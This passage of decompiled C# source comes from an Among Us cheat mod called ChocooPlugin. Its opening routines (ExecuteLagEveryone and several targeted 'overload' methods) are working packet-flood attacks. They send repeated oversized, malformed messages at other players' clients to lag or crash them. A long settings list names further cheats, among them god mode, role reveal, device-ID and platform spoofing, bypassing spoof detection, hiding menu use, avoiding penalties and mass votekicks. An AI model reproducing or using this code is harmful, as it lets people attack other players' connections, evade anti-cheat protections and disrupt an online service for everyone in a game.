      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Overflow Method 8 error: " + ex.Message));
      }
    }

    private void ExecuteLagEveryone()
    {
      if ((double) Time.time - (double) this.lastLagEveryoneFireTime < 7.0)
        return;
      try
      {
        if (Object.op_Equality((Object) AmongUsClient.Instance, (Object) null) || ((InnerNetClient) AmongUsClient.Instance).connection == null)
          return;
        foreach (PlayerControl playerControl in PlayerControl.AllPlayerControls.ToArray())
        {
          if (!Object.op_Equality((Object) playerControl, (Object) null) && !((InnerNetObject) playerControl).AmOwner && !Object.op_Equality((Object) playerControl.Data, (Object) null))
          {
            int clientIdFromCharacter = ((InnerNetClient) AmongUsClient.Instance).GetClientIdFromCharacter(playerControl);
            if (clientIdFromCharacter >= 0)
            {
              for (int index1 = 0; index1 < 15; ++index1)
              {
                MessageWriter messageWriter = MessageWriter.Get((SendOption) 1);
                messageWriter.StartMessage((byte) 6);
                messageWriter.Write(((InnerNetClient) AmongUsClient.Instance).GameId);
                messageWriter.WritePacked(clientIdFromCharacter);
                for (int index2 = 0; index2 < 175; ++index2)
                {
                  messageWriter.StartMessage((byte) 1);
                  messageWriter.WritePacked((uint) (50000 + index1 * 100 + index2));
                  messageWriter.EndMessage();
                }
                messageWriter.EndMessage();
                ((Connection) ((InnerNetClient) AmongUsClient.Instance).connection).Send(messageWriter);
                messageWriter.Recycle();
              }
            }
          }
        }
        this.lastLagEveryoneFireTime = Time.time;
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("LagEveryone error: " + ex.Message));
      }
    }

    private void ExecuteTargetedOverload()
    {
      if (!ChocooPlugin.TargetedOverloadEnabled)
        return;
      if (Object.op_Equality((Object) PlayerControl.LocalPlayer, (Object) null) || Object.op_Equality((Object) AmongUsClient.Instance, (Object) null))
        return;
      try
      {
        switch (ChocooPlugin.targetedOverloadMethod)
        {
          case 1:
            if ((double) Time.time - (double) this.lastTargetedMethod3Time < 0.60000002384185791 || ((InnerNetClient) AmongUsClient.Instance).connection == null)
              break;
            PlayerControl playerControl1 = (PlayerControl) null;
            foreach (PlayerControl allPlayerControl in PlayerControl.AllPlayerControls)
            {
              if (!Object.op_Equality((Object) allPlayerControl, (Object) null) && !((InnerNetObject) allPlayerControl).AmOwner && !Object.op_Equality((Object) allPlayerControl.Data, (Object) null) && ((InnerNetClient) AmongUsClient.Instance).GetClientIdFromCharacter(allPlayerControl) == ChocooPlugin.selectedTargetId)
              {
                playerControl1 = allPlayerControl;
                break;
              }
            }
            if (Object.op_Equality((Object) playerControl1, (Object) null))
              break;
            int clientIdFromCharacter1 = ((InnerNetClient) AmongUsClient.Instance).GetClientIdFromCharacter(playerControl1);
            if (clientIdFromCharacter1 < 0)
              break;
            for (int index1 = 0; index1 < 15; ++index1)
            {
              MessageWriter messageWriter = MessageWriter.Get((SendOption) 1);
              messageWriter.StartMessage((byte) 6);
              messageWriter.Write(((InnerNetClient) AmongUsClient.Instance).GameId);
              messageWriter.WritePacked(clientIdFromCharacter1);
              for (int index2 = 0; index2 < 175; ++index2)
              {
                messageWriter.StartMessage((byte) 1);
                messageWriter.WritePacked((uint) (50000 + index1 * 100 + index2));
                messageWriter.EndMessage();
              }
              messageWriter.EndMessage();
              ((Connection) ((InnerNetClient) AmongUsClient.Instance).connection).Send(messageWriter);
              messageWriter.Recycle();
            }
            this.lastTargetedMethod3Time = Time.time;
            break;
          case 2:
            if (Object.op_Equality((Object) AmongUsClient.Instance, (Object) null) || ((InnerNetClient) AmongUsClient.Instance).connection == null)
              break;
            PlayerControl playerControl2 = (PlayerControl) null;
            foreach (PlayerControl allPlayerControl in PlayerControl.AllPlayerControls)
            {
              if (!Object.op_Equality((Object) allPlayerControl, (Object) null) && !((InnerNetObject) allPlayerControl).AmOwner && !Object.op_Equality((Object) allPlayerControl.Data, (Object) null) && ((InnerNetClient) AmongUsClient.Instance).GetClientIdFromCharacter(allPlayerControl) == ChocooPlugin.selectedTargetId)
              {
                playerControl2 = allPlayerControl;
                break;
              }
            }
            if (Object.op_Equality((Object) playerControl2, (Object) null) || playerControl2.Data.Disconnected)
            {
              ChocooPlugin.TargetedOverloadEnabled = false;
              this.overload8TargetWavesLeft = 0;
              break;
            }
            --this.overload8TargetTimer;
            if ((double) this.overload8TargetTimer <= 0.0)
            {
              this.overload8TargetWavesLeft = 150;
              this.overload8TargetTimer = 450f;
            }
            if (this.overload8TargetWavesLeft <= 0)
              break;
            int clientIdFromCharacter2 = ((InnerNetClient) AmongUsClient.Instance).GetClientIdFromCharacter(playerControl2);
            if (clientIdFromCharacter2 < 0)
              break;
            MessageWriter messageWriter1 = MessageWriter.Get((SendOption) 0);
            messageWriter1.StartMessage((byte) 6);
            messageWriter1.Write(((InnerNetClient) AmongUsClient.Instance).GameId);
            messageWriter1.WritePacked(clientIdFromCharacter2);
            messageWriter1.StartMessage((byte) 1);
            messageWriter1.Write(0);
            messageWriter1.EndMessage();
            for (int index = 0; index < 256 /*0x0100*/; ++index)
            {
              messageWriter1.StartMessage((byte) index);
              messageWriter1.EndMessage();
            }
            messageWriter1.EndMessage();
            ((Connection) ((InnerNetClient) AmongUsClient.Instance).connection).Send(messageWriter1);
            messageWriter1.Recycle();
            --this.overload8TargetWavesLeft;
            break;
          case 3:
            if ((double) Time.time - (double) ChocooPlugin.ChocooMenu.lastTargetedMixMethod3Time < 1.0 || ((InnerNetClient) AmongUsClient.Instance).connection == null)
              break;
            PlayerControl playerControl3 = (PlayerControl) null;
            foreach (PlayerControl allPlayerControl in PlayerControl.AllPlayerControls)
            {
              if (!Object.op_Equality((Object) allPlayerControl, (Object) null) && !((InnerNetObject) allPlayerControl).AmOwner && !Object.op_Equality((Object) allPlayerControl.Data, (Object) null) && ((InnerNetClient) AmongUsClient.Instance).GetClientIdFromCharacter(allPlayerControl) == ChocooPlugin.selectedTargetId)
              {
                playerControl3 = allPlayerControl;
                break;
              }
            }
            if (Object.op_Equality((Object) playerControl3, (Object) null))
              break;
            int clientIdFromCharacter3 = ((InnerNetClient) AmongUsClient.Instance).GetClientIdFromCharacter(playerControl3);
            if (clientIdFromCharacter3 < 0 || clientIdFromCharacter3 == ((InnerNetClient) AmongUsClient.Instance).ClientId)
              break;
            for (int index3 = 0; index3 < 20; ++index3)
            {
              MessageWriter messageWriter2 = MessageWriter.Get((SendOption) 0);
              messageWriter2.StartMessage((byte) 6);
              messageWriter2.Write(((InnerNetClient) AmongUsClient.Instance).GameId);
              messageWriter2.WritePacked(clientIdFromCharacter3);
              for (int index4 = 0; index4 < 175; ++index4)
              {
                switch (index4 % 3)
                {
                  case 0:
                    messageWriter2.StartMessage((byte) 69);
                    messageWriter2.EndMessage();
                    break;
                  case 1:
                    messageWriter2.StartMessage((byte) 1);
                    messageWriter2.Write(0);
                    messageWriter2.EndMessage();
                    break;
                  default:
                    messageWriter2.StartMessage((byte) 2);
                    messageWriter2.Write(0);
                    messageWriter2.EndMessage();
                    break;
                }
              }
              messageWriter2.EndMessage();
              ((Connection) ((InnerNetClient) AmongUsClient.Instance).connection).Send(messageWriter2);
              messageWriter2.Recycle();
            }
            ChocooPlugin.ChocooMenu.lastTargetedMixMethod3Time = Time.time;
            break;
          case 5:
            if ((double) Time.time - (double) this.lastTargetedMethod2Time < 0.800000011920929 || !((InnerNetClient) AmongUsClient.Instance).AmConnected || ((InnerNetClient) AmongUsClient.Instance).AmHost)
              break;
            PlayerControl playerControl4 = (PlayerControl) null;
            foreach (PlayerControl allPlayerControl in PlayerControl.AllPlayerControls)
            {
              if (!Object.op_Equality((Object) allPlayerControl, (Object) null) && !((InnerNetObject) allPlayerControl).AmOwner && !Object.op_Equality((Object) allPlayerControl.Data, (Object) null) && ((InnerNetClient) AmongUsClient.Instance).GetClientIdFromCharacter(allPlayerControl) == ChocooPlugin.selectedTargetId)
              {
                playerControl4 = allPlayerControl;
                break;
              }
            }
            if (Object.op_Equality((Object) playerControl4, (Object) null) || playerControl4.Data.Disconnected)
            {
              ChocooPlugin.TargetedOverloadEnabled = false;
              break;
            }
            int clientIdFromCharacter4 = ((InnerNetClient) AmongUsClient.Instance).GetClientIdFromCharacter(playerControl4);
            if (clientIdFromCharacter4 < 0 || clientIdFromCharacter4 == ((InnerNetClient) AmongUsClient.Instance).ClientId)
              break;
            int clientId = ((InnerNetClient) AmongUsClient.Instance).ClientId;
            int gameId = ((InnerNetClient) AmongUsClient.Instance).GameId;
            List<MessageWriter> messageWriterList = new List<MessageWriter>();
            for (int index5 = 0; index5 < 18; ++index5)
            {
              int num1 = ChocooPlugin._overloadMethod2Batch++;
              MessageWriter messageWriter3 = MessageWriter.Get((SendOption) 1);
              messageWriter3.StartMessage((byte) 6);
              messageWriter3.Write(gameId);
              messageWriter3.WritePacked(clientIdFromCharacter4);
              for (int index6 = 0; index6 < 75; ++index6)
              {
                long num2 = 999000000000L + (long) ((int) playerControl4.PlayerId * 20000) + (long) (num1 * 50) + (long) index6;
                if (num2 != (long) clientId)
                {
                  messageWriter3.StartMessage((byte) (1 + index6 % 3));
                  messageWriter3.Write((float) num2);
                  messageWriter3.Write((byte) (123 + num1));
                  messageWriter3.WritePacked((uint) ((ulong) num2 & 16777215UL /*0xFFFFFF*/));
                  messageWriter3.EndMessage();
                }
              }
              messageWriter3.StartMessage((byte) 6);
              messageWriter3.Write("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
              messageWriter3.EndMessage();
              messageWriter3.EndMessage();
              messageWriterList.Add(messageWriter3);
            }
            foreach (MessageWriter messageWriter4 in messageWriterList)
            {
              ((InnerNetClient) AmongUsClient.Instance).SendOrDisconnect(messageWriter4);
              messageWriter4.Recycle();
            }
            this.lastTargetedMethod2Time = Time.time;
            break;
        }
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("Targeted Overload: " + ex.Message));
      }
    }

    private void DrawSabotageButton(string label, bool isActive, Action onClick)
    {
      GUI.backgroundColor = isActive ? new Color(0.2f, 0.8f, 0.2f, 1f) : new Color(0.8f, 0.2f, 0.2f, 1f);
      if (GUILayout.Button(label, new GUILayoutOption[1]
      {
        GUILayout.Height(35f)
      }) && onClick != null)
        onClick();
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.Space(5f);
    }

    private void DrawToggleSwitch(string label, ref bool value)
    {
      if (!this.toggleAnimationStates.ContainsKey(label))
        this.toggleAnimationStates[label] = value ? 1f : 0.0f;
      float num1 = value ? 1f : 0.0f;
      this.toggleAnimationStates[label] = !ChocooPlugin.DisableAnimations ? Mathf.Lerp(this.toggleAnimationStates[label], num1, Time.deltaTime * 8f) : num1;
      GUILayout.BeginHorizontal((Il2CppReferenceArray<GUILayoutOption>) null);
      GUI.contentColor = ChocooPlugin.GetRGBText();
      GUILayout.Label(label, new GUILayoutOption[1]
      {
        GUILayout.Width(140f)
      });
      GUILayout.FlexibleSpace();
      float num2 = 45f;
      float num3 = 22f;
      Rect rect = GUILayoutUtility.GetRect(num2, num3);
      bool flag = ((Rect) ref rect).Contains(Event.current.mousePosition);
      Color color1;
      // ISSUE: explicit constructor call
      ((Color) ref color1).\u002Ector(0.25f, 0.25f, 0.25f, 1f);
      Color color2;
      // ISSUE: explicit constructor call
      ((Color) ref color2).\u002Ector(0.5f, 0.2f, 0.9f, 1f);
      Color col1 = Color.Lerp(color1, color2, this.toggleAnimationStates[label]);
      if (flag)
        col1 = Color.Lerp(col1, Color.white, 0.3f);
      GUIStyle guiStyle1 = new GUIStyle(GUI.skin.box);
      guiStyle1.normal.background = this.MakeTex(2, 2, col1);
      GUI.backgroundColor = col1;
      GUI.Box(rect, "", guiStyle1);
      if (GUI.Button(rect, "", GUIStyle.none))
      {
        value = !value;
        this.SaveFeatureState(label, value);
      }
      float num4 = num3 - 4f;
      float num5 = Mathf.Lerp(((Rect) ref rect).x + 2f, (float) ((double) ((Rect) ref rect).x + (double) num2 - (double) num4 - 2.0), this.toggleAnimationStates[label]);
      Color col2 = flag ? new Color(1f, 1f, 1f, 1f) : Color.white;
      GUIStyle guiStyle2 = new GUIStyle(GUI.skin.box);
      guiStyle2.normal.background = this.MakeTex(2, 2, col2);
      GUI.backgroundColor = col2;
      GUI.Box(new Rect(num5, ((Rect) ref rect).y + 2f, num4, num4), "", guiStyle2);
      GUI.backgroundColor = ChocooPlugin.GetRGBColor();
      GUILayout.EndHorizontal();
      GUILayout.Space(5f);
    }

    private void SaveFeatureState(string label, bool value)
    {
      string s = label;
      // ISSUE: reference to a compiler-generated method
      switch (\u003CPrivateImplementationDetails\u003E.ComputeStringHash(s))
      {
        case 114816:
          if (!(s == "Auto-Ban Cheaters (Host)"))
            break;
          ChocooPlugin.Config_AutoBanEnabled.Value = value;
          break;
        case 51093082:
          if (!(s == "Show Votekick Info"))
            break;
          ChocooPlugin.Config_ShowVotekickInfo.Value = value;
          break;
        case 78693321:
          if (!(s == "Spoof Menu Identity"))
            break;
          ChocooPlugin.Config_SpoofMenuEnabled.Value = value;
          break;
        case 173091344:
          if (!(s == "TP to Cursor"))
            break;
          ChocooPlugin.Config_TeleportToCursorEnabled.Value = value;
          break;
        case 305727902:
          if (!(s == "Ban Blacklists"))
            break;
          ChocooPlugin.Config_BanBlacklistedEnabled.Value = value;
          break;
        case 336289103:
          if (!(s == "Disable Custom Theme"))
            break;
          ChocooPlugin.Config_DisableCustomTheme.Value = value;
          break;
        case 388724808:
          if (!(s == "See Protections"))
            break;
          ChocooPlugin.Config_SeeProtectionsEnabled.Value = value;
          break;
        case 397248711:
          if (!(s == "Kill Other Imposters"))
            break;
          ChocooPlugin.Config_KillOtherImpostersEnabled.Value = value;
          break;
        case 419635339:
          if (!(s == "No Seeker Animation"))
            break;
          ChocooPlugin.Config_NoSeekerAnimEnabled.Value = value;
          break;
        case 451754043:
          if (!(s == "Abnormal Report/Meeting"))
            break;
          ChocooPlugin.Config_CheckAbnormalReportMeeting.Value = value;
          break;
        case 483290038:
          if (!(s == "Auto Kill"))
            break;
          ChocooPlugin.Config_AutoKillEnabled.Value = value;
          break;
        case 522798336:
          if (!(s == "God Mode"))
            break;
          ChocooPlugin.Config_GodModeEnabled.Value = value;
          break;
        case 541140153:
          if (!(s == "Spoof Device ID"))
            break;
          ChocooPlugin.Config_SpoofDeviceIdEnabled.Value = value;
          break;
        case 546332052:
          if (!(s == "Abnormal Cosmetic Change"))
            break;
          ChocooPlugin.Config_CheckAbnormalCosmeticChange.Value = value;
          break;
        case 571030591:
          if (!(s == "Disable Meetings"))
            break;
          ChocooPlugin.Config_DisableMeetings.Value = value;
          break;
        case 585524890:
          if (!(s == "Zoom Out"))
            break;
          ChocooPlugin.Config_ZoomOutEnabled.Value = value;
          break;
        case 598346495:
          if (!(s == "Allow All Characters"))
            break;
          ChocooPlugin.Config_AllowAllCharactersEnabled.Value = value;
          break;
        case 628479060:
          if (!(s == "See Ghosts"))
            break;
          ChocooPlugin.Config_SeeGhostsEnabled.Value = value;
          break;
        case 693220533:
          if (!(s == "Abnormal Platforms"))
            break;
          ChocooPlugin.Config_CheckAbnormalPlatforms.Value = value;
          break;
        case 699740606:
          if (!(s == "Disable Venting for All"))
            break;
          ChocooPlugin.Config_DisableVentingEnabled.Value = value;
          break;
        case 823429567:
          if (!(s == "Endless Vent Time"))
            break;
          ChocooPlugin.Config_EndlessVentTime.Value = value;
          break;
        case 840444804:
          if (!(s == "Kill Notification"))
            break;
          ChocooPlugin.Config_KillNotificationEnabled.Value = value;
          break;
        case 921661618:
          if (!(s == "Accurate Disconnect Reasons"))
            break;
          ChocooPlugin.Config_AccurateDisconnectReasonsEnabled.Value = value;
          break;
        case 978085209:
          if (!(s == "Find Daters Lobby"))
            break;
          ChocooPlugin.Config_FindDatersEnabled.Value = value;
          break;
        case 1014590481:
          if (!(s == "Extend Chat History"))
            break;
          ChocooPlugin.Config_ExtendChatHistoryEnabled.Value = value;
          break;
        case 1027609785:
          if (!(s == "SpeedHack"))
            break;
          ChocooPlugin.Config_SpeedHackEnabled.Value = value;
          break;
        case 1031698754:
          if (!(s == "Show Votekick Counter"))
            break;
          ChocooPlugin.Config_ShowVotekickCounter.Value = value;
          break;
        case 1084017109:
          if (!(s == "Reveal Votes"))
            break;
          ChocooPlugin.Config_RevealVotesEnabled.Value = value;
          break;
        case 1105297798:
          if (!(s == "Disable Animations"))
            break;
          ChocooPlugin.Config_DisableAnimations.Value = value;
          break;
        case 1127697146:
          if (!(s == "Move Menu to Cursor"))
            break;
          ChocooPlugin.Config_MoveMenuToCursor.Value = value;
          break;
        case 1128974299:
          if (!(s == "Abnormal Level"))
            break;
          ChocooPlugin.Config_CheckAbnormalLevel.Value = value;
          break;
        case 1152271897:
          if (!(s == "No Shh Screen"))
            break;
          ChocooPlugin.Config_NoShhScreenEnabled.Value = value;
          break;
        case 1176702321:
          if (!(s == "Spoof Platform"))
            break;
          ChocooPlugin.Config_ShowPlatformSpoof.Value = value;
          break;
        case 1195447740:
          if (!(s == "Abnormal Task Completion"))
            break;
          ChocooPlugin.Config_CheckAbnormalTaskCompletion.Value = value;
          break;
        case 1215471292:
          if (!(s == "Votekick Many Players"))
            break;
          ChocooPlugin.Config_VotekickAllEnabled.Value = value;
          break;
        case 1243286512:
          if (!(s == "Extended Lobby List"))
            break;
          ChocooPlugin.Config_ExtendedLobbyEnabled.Value = value;
          break;
        case 1304088263:
          if (!(s == "Randomize Outfit"))
            break;
          ChocooPlugin.Config_RandomizeOutfit.Value = value;
          break;
        case 1309877338:
          if (!(s == "Abnormal Votekick Spam"))
            break;
          ChocooPlugin.Config_CheckAbnormalVotekickSpam.Value = value;
          break;
        case 1333262036:
          if (!(s == "See Mod Users"))
            break;
          ChocooPlugin.Config_SeeModUsersEnabled.Value = value;
          break;
        case 1368453839:
          if (!(s == "Bypass Visual Tasks Being Off"))
            break;
          ChocooPlugin.Config_BypassVisualTasksEnabled.Value = value;
          break;
        case 1426049704:
          if (!(s == "Endless Tracking"))
            break;
          ChocooPlugin.Config_EndlessTracking.Value = value;
          break;
        case 1487299076:
          if (!(s == "Abnormal Venting"))
            break;
          ChocooPlugin.Config_CheckAbnormalVenting.Value = value;
          break;
        case 1563689794:
          if (!(s == "No Vent Cooldown"))
            break;
          ChocooPlugin.Config_NoVentCooldown.Value = value;
          break;
        case 1579314152:
          if (!(s == "Spoof Level"))
            break;
          ChocooPlugin.Config_ShowLevelSpoof.Value = value;
          break;
        case 1653829359:
          if (!(s == "Show Player Info"))
            break;
          ChocooPlugin.Config_ShowPlayerInfo.Value = value;
          break;
        case 1689032974:
          if (!(s == "Disable Game End"))
            break;
          ChocooPlugin.Config_DisableGameEndEnabled.Value = value;
          break;
        case 1778612011:
          if (!(s == "Task Speedrun Mode"))
            break;
          ChocooPlugin.Config_TaskSpeedrunEnabled.Value = value;
          break;
        case 1778797125:
          if (!(s == "See Players in Vents"))
            break;
          ChocooPlugin.Config_SeePlayersInVentsEnabled.Value = value;
          break;
        case 1822125143:
          if (!(s == "RGB Mode"))
            break;
          ChocooPlugin.Config_RGBMode.Value = value;
          break;
        case 1858184668:
          if (!(s == "No Tracking Delay"))
            break;
          ChocooPlugin.Config_NoTrackingDelay.Value = value;
          break;
        case 1911781464:
          if (!(s == "Allow Ctrl+(C/V) in Chat"))
            break;
          ChocooPlugin.Config_AllowCtrlCVEnabled.Value = value;
          break;
        case 1913133059:
          if (!(s == "No Shapeshift Animation"))
            break;
          ChocooPlugin.Config_NoShapeshiftAnimation.Value = value;
          break;
        case 1955176916:
          if (!(s == "No Tracking Cooldown"))
            break;
          ChocooPlugin.Config_NoTrackingCooldown.Value = value;
          break;
        case 1971020681:
          if (!(s == "Unlock Cosmetics"))
            break;
          ChocooPlugin.Config_CosmeticsUnlockerEnabled.Value = value;
          break;
        case 1977104381:
          if (!(s == "Show Lobby Timer"))
            break;
          ChocooPlugin.Config_ShowLobbyTimerEnabled.Value = value;
          break;
        case 2041500273:
          if (!(s == "See Kill Cooldown"))
            break;
          ChocooPlugin.Config_ShowKillCooldown.Value = value;
          break;
        case 2064207162:
          if (!(s == "Skip Death Animation"))
            break;
          ChocooPlugin.Config_DisableKillAnimationEnabled.Value = value;
          break;
        case 2071922168:
          if (!(s == "Dark Mode"))
            break;
          ChocooPlugin.Config_DarkModeEnabled.Value = value;
          break;
        case 2134192955:
          if (!(s == "Slide by Cursor"))
            break;
          ChocooPlugin.Config_MoveSelfByCursorEnabled.Value = value;
          break;
        case 2147171500:
          if (!(s == "Abnormal Vanish"))
            break;
          ChocooPlugin.Config_CheckAbnormalVanish.Value = value;
          break;
        case 2202175972:
          if (!(s == "Anti-Exploits"))
            break;
          ChocooPlugin.Config_AntiExploitsEnabled.Value = value;
          break;
        case 2218152187:
          if (!(s == "Auto Rejoin on Game End"))
            break;
          ChocooPlugin.Config_AutoRejoinEnabled.Value = value;
          break;
        case 2348340167:
          if (!(s == "No Shadows"))
            break;
          ChocooPlugin.Config_NoShadowsEnabled.Value = value;
          break;
        case 2373709972:
          if (!(s == "More Lobby Info"))
            break;
          ChocooPlugin.Config_MoreLobbyInfoEnabled.Value = value;
          break;
        case 2505893022:
          if (!(s == "Spam Chat"))
            break;
          ChocooPlugin.Config_SpamChatEnabled.Value = value;
          break;
        case 2533055505:
          if (!(s == "Unlock Vents"))
            break;
          ChocooPlugin.Config_UnlockVentsEnabled.Value = value;
          break;
        case 2561751885:
          if (!(s == "Enable Fake Role"))
            break;
          ChocooPlugin.Config_SetFakeRoleEnabled.Value = value;
          break;
        case 2568255092:
          if (!(s == "Copy Code on Disconnect"))
            break;
          ChocooPlugin.Config_AutoCopyCodeEnabled.Value = value;
          break;
        case 2626044111:
          if (!(s == "Hide Menu Usage to Others"))
            break;
          ChocooPlugin.Config_StealthMode.Value = value;
          break;
        case 2720309981:
          if (!(s == "Become Immortal"))
            break;
          ChocooPlugin.Config_BecomeImmortalEnabled.Value = value;
          break;
        case 2797566085:
          if (!(s == "Show Menu on Startup"))
            break;
          ChocooPlugin.Config_ShowMenuOnStartup.Value = value;
          break;
        case 2802368137:
          if (!(s == "Reveal Roles"))
            break;
          ChocooPlugin.Config_SeeRolesEnabled.Value = value;
          break;
        case 2955159794:
          if (!(s == "Abnormal Protect"))
            break;
          ChocooPlugin.Config_CheckAbnormalProtect.Value = value;
          break;
        case 2972158836:
          if (!(s == "Disable Telemetry"))
            break;
          ChocooPlugin.Config_DisableTelemetryEnabled.Value = value;
          break;
        case 3077835410:
          if (!(s == "Endless Battery"))
            break;
          ChocooPlugin.Config_EndlessBattery.Value = value;
          break;
        case 3109701564:
          if (!(s == "Reduce Chat Cooldown"))
            break;
          ChocooPlugin.Config_ReduceChatCooldownEnabled.Value = value;
          break;
        case 3174636275:
          if (!(s == "Do Tasks as Impostor"))
            break;
          ChocooPlugin.Config_ImpostorTasksEnabled.Value = value;
          break;
        case 3232402017:
          if (!(s == "Extend Chat Character Limit"))
            break;
          ChocooPlugin.Config_ExtendChatLimitEnabled.Value = value;
          break;
        case 3309948629:
          if (!(s == "Unlimited Kill Range"))
            break;
          ChocooPlugin.Config_UnlimitedKillRange.Value = value;
          break;
        case 3334948974:
          if (!(s == "No Vitals Cooldown"))
            break;
          ChocooPlugin.Config_NoVitalsCooldown.Value = value;
          break;
        case 3342292431:
          if (!(s == "Avoid Penalties"))
            break;
          ChocooPlugin.Config_AvoidPenaltiesEnabled.Value = value;
          break;
        case 3460551479:
          if (!(s == "Bypass Platform Spoof Detections"))
            break;
          ChocooPlugin.Config_BypassPlatformDetectionEnabled.Value = value;
          break;
        case 3521356016:
          if (!(s == "Abnormal Murder"))
            break;
          ChocooPlugin.Config_CheckAbnormalMurder.Value = value;
          break;
        case 3528420065:
          if (!(s == "Bypass URL Block"))
            break;
          ChocooPlugin.Config_BypassURLBlockEnabled.Value = value;
          break;
        case 3576211152:
          if (!(s == "Abnormal Shapeshift"))
            break;
          ChocooPlugin.Config_CheckAbnormalShapeshift.Value = value;
          break;
        case 3602235653:
          if (!(s == "Enable Anticheat"))
            break;
          ChocooPlugin.Config_AnticheatEnabled.Value = value;
          break;
        case 3628374458:
          if (!(s == "Abnormal Color Change"))
            break;
          ChocooPlugin.Config_CheckAbnormalColorChange.Value = value;
          break;
        case 3793362322:
          if (!(s == "See Phantoms"))
            break;
          ChocooPlugin.Config_SeePhantomsEnabled.Value = value;
          break;
        case 3825717412:
          if (!(s == "Spoof Game Version"))
            break;
          ChocooPlugin.Config_SpoofGameVersionEnabled.Value = value;
          break;
        case 3846652778:
          if (!(s == "Endless Shapeshift Duration"))
            break;
          ChocooPlugin.Config_EndlessShapeshiftDuration.Value = value;
          break;
        case 3852251631:
          if (!(s == "Votekick All (Auto Rejoin)"))
            break;
          ChocooPlugin.Config_VotekickAutoRejoinEnabled.Value = value;
          break;
        case 3916229251:
          if (!(s == "Abnormal Sabotage"))
            break;
          ChocooPlugin.Config_CheckAbnormalSabotage.Value = value;
          break;
        case 3929400152:
          if (!(s == "No Clip"))
            break;
          ChocooPlugin.Config_NoClipEnabled.Value = value;
          break;
        case 3950066275:
          if (!(s == "Use Modded Protocol"))
            break;
          ChocooPlugin.Config_UseModdedProtocol.Value = value;
          break;
        case 3951370170:
          if (!(s == "Always Chat"))
            break;
          ChocooPlugin.Config_AlwaysShowChatEnabled.Value = value;
          break;
        case 3954593846:
          if (!(s == "Keep Protecting All"))
            break;
          ChocooPlugin.Config_KeepProtectingAllEnabled.Value = value;
          break;
        case 4002002161:
          if (!(s == "Spin (Client)"))
            break;
          ChocooPlugin.Config_SpinEnabled.Value = value;
          break;
        case 4017382021:
          if (!(s == "Anti-Blackout"))
            break;
          ChocooPlugin.Config_AntiBlackoutEnabled.Value = value;
          break;
        case 4106663488:
          if (!(s == "Disable Votekicks"))
            break;
          ChocooPlugin.Config_DisableVotekicks.Value = value;
          break;
        case 4160284323:
          if (!(s == "Unlimited Interrogate Range"))
            break;
          ChocooPlugin.Config_UnlimitedInterrogateRange.Value = value;
          break;
        case 4196531710:
          if (!(s == "Disable Sabotages"))
            break;
          ChocooPlugin.Config_DisableSabotagesEnabled.Value = value;
          break;
        case 4206477414:
          if (!(s == "Show Host"))
            break;
          ChocooPlugin.Config_ShowHostEnabled.Value = value;
          break;
      }
    }

    private Texture2D MakeTex(int width, int height, Color col)
    {
      Texture2D texture2D;
      if (!ChocooPlugin.ChocooMenu._texCache.TryGetValue(col, out texture2D) || Object.op_Equality((Object) texture2D, (Object) null))
      {
        texture2D = new Texture2D(width, height);
        Color[] colorArray = new Color[width * height];
        for (int index = 0; index < colorArray.Length; ++index)
          colorArray[index] = col;
        texture2D.SetPixels(Il2CppStructArray<Color>.op_Implicit(colorArray));
        texture2D.Apply();
        ChocooPlugin.ChocooMenu._texCache[col] = texture2D;
      }
      return texture2D;
    }

    private float GetDropdownHeight(string dropdownKey, bool isOpen, float targetHeight)
    {
      if (!this.dropdownAnimations.ContainsKey(dropdownKey))
        this.dropdownAnimations[dropdownKey] = isOpen ? targetHeight : 0.0f;
      float dropdownAnimation = this.dropdownAnimations[dropdownKey];
      float num = isOpen ? targetHeight : 0.0f;
      float dropdownHeight = Mathf.Lerp(dropdownAnimation, num, Time.deltaTime * 15f);
      if ((double) Mathf.Abs(dropdownHeight - num) < 0.5)
        dropdownHeight = num;
      this.dropdownAnimations[dropdownKey] = dropdownHeight;
      return dropdownHeight;
    }

    private void ResetCharacterRotation()
    {
      if (!Object.op_Inequality((Object) PlayerControl.LocalPlayer, (Object) null))
        return;
      ChocooPlugin.spinAngle = 0.0f;
      ((Component) PlayerControl.LocalPlayer).transform.localRotation = Quaternion.identity;
    }

    private void HandleReactor(ShipStatus ship, byte mapId, byte amount)
    {
      if (mapId == (byte) 2)
        ship.RpcUpdateSystem((SystemTypes) 21, amount);
      else if (mapId == (byte) 4)
        ship.RpcUpdateSystem((SystemTypes) 58, amount);
      else
        ship.RpcUpdateSystem((SystemTypes) 3, amount);
    }

    private void HandleOxygen(ShipStatus ship, byte mapId, byte amount)
    {
      if (mapId == (byte) 4 || mapId == (byte) 2 || mapId == (byte) 5)
        return;
      ship.RpcUpdateSystem((SystemTypes) 8, amount);
    }

    private void HandleDoors(ShipStatus ship)
    {
      for (int index = 0; index < ((Il2CppArrayBase<OpenableDoor>) ship.AllDoors).Count; ++index)
      {
        try
        {
          OpenableDoor allDoor = ((Il2CppArrayBase<OpenableDoor>) ship.AllDoors)[index];
          ship.RpcCloseDoorsOfType(allDoor.Room);
        }
        catch
        {
        }
      }
    }

    private void SendServerScan(bool start)
    {
      PlayerControl localPlayer = PlayerControl.LocalPlayer;
      if (Object.op_Equality((Object) localPlayer, (Object) null))
        return;
      MessageWriter messageWriter = ((InnerNetClient) AmongUsClient.Instance).StartRpcImmediately(((InnerNetObject) localPlayer).NetId, (byte) 15, (SendOption) 1, -1);
      messageWriter.Write(start);
      messageWriter.Write(localPlayer.PlayerId);
      ((InnerNetClient) AmongUsClient.Instance).FinishRpcImmediately(messageWriter);
      localPlayer.SetScanner(start, localPlayer.PlayerId);
    }

    private void ForcePlayAnimation(byte animationType)
    {
      try
      {
        if (Object.op_Equality((Object) PlayerControl.LocalPlayer, (Object) null))
          return;
        PlayerControl.LocalPlayer.RpcPlayAnimation(animationType);
      }
      catch (Exception ex)
      {
        ChocooPlugin.Logger.LogError((object) ("ForcePlayAnimation error: " + ex.Message));
      }
    }

    private void ExecuteEmergencyRPC()
    {
      PlayerControl localPlayer = PlayerControl.LocalPlayer;
      if (!Object.op_Inequality((Object) localPlayer, (Object) null))
        return;
      MessageWriter messageWriter = ((InnerNetClient) AmongUsClient.Instance).StartRpcImmediately(((InnerNetObject) localPlayer).NetId, (byte) 11, (SendOption) 1, -1);
